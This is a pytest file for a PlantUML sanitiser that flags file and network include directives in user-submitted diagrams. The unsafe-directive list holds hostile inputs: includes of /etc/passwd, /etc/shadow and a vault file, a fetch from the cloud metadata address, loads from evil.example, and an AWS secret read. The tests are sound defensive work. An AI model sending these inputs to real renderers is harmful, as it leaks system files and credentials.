"""Untrusted-PUML hardening: file/network preprocessor directives in a user-submitted
body are rejected, while the renderer's own managed includes and bundled stdlib are allowed.

Threat: with PlantUML's default security profile, a submitted `!include /etc/passwd`
embeds the file's contents in the rendered SVG (confirmed empirically). PlantUML's own
profiles are all-or-nothing for our include model, so the control is at our trust boundary.
"""

from __future__ import annotations

import pytest

from src.infrastructure.rendering.puml_safety import (
    UnsafePumlError,
    assert_user_puml_safe,
    find_unsafe_puml_directives,
)


def _body(*directives: str) -> str:
    return "@startuml\n" + "\n".join(directives) + "\nAlice -> Bob\n@enduml\n"


class TestSafeBodies:
    def test_plain_content_is_safe(self) -> None:
        assert find_unsafe_puml_directives(_body("class A", "A --> B")) == []

    def test_managed_relative_macro_includes_allowed(self) -> None:
        body = _body(
            "!include ../_archimate-stereotypes.puml",
            "!include ../_archimate-glyphs.puml",
            "!include ../_archimate-relations.puml",
            "!include ../_macros.puml",
        )
        assert find_unsafe_puml_directives(body) == []

    def test_deeper_relative_managed_include_allowed(self) -> None:
        # grouped diagrams may sit a level deeper
        assert find_unsafe_puml_directives(_body("!include ../../_macros.puml")) == []

    def test_bundled_stdlib_angle_include_allowed(self) -> None:
        assert find_unsafe_puml_directives(_body("!include <C4/C4_Component>")) == []

    def test_bare_theme_allowed(self) -> None:
        assert find_unsafe_puml_directives(_body("!theme plain")) == []

    def test_assert_does_not_raise_on_safe(self) -> None:
        assert_user_puml_safe(_body("!include ../_archimate-stereotypes.puml", "class A"))


class TestUnsafeBodies:
    @pytest.mark.parametrize("directive", [
        "!include /etc/passwd",
        "!include /home/arch/.config/arch-assurance/vault.enc",
        "!include ../../../../etc/shadow",
        "!include C:\\secrets.txt",
        "!includeurl http://169.254.169.254/latest/meta-data/",
        "!include http://evil.example/x.puml",
        "!includesub some.puml!SUB",
        "!import /etc/hosts",
        "!theme mytheme from /etc/passwd",
        "!theme x from http://evil.example",
        "%load_json(\"/etc/passwd\")",
        "%getenv(\"AWS_SECRET_ACCESS_KEY\")",
        "!include ../secret_config.puml",
        "!include ./arbitrary.puml",
    ])
    def test_dangerous_directive_is_flagged(self, directive: str) -> None:
        offenders = find_unsafe_puml_directives(_body(directive))
        assert offenders, f"expected {directive!r} to be flagged"

    def test_assert_raises_with_message(self) -> None:
        with pytest.raises(UnsafePumlError, match="forbidden file/network"):
            assert_user_puml_safe(_body("!include /etc/passwd"))

    def test_case_and_whitespace_insensitive(self) -> None:
        assert find_unsafe_puml_directives(_body("   !INCLUDE   /etc/passwd  "))
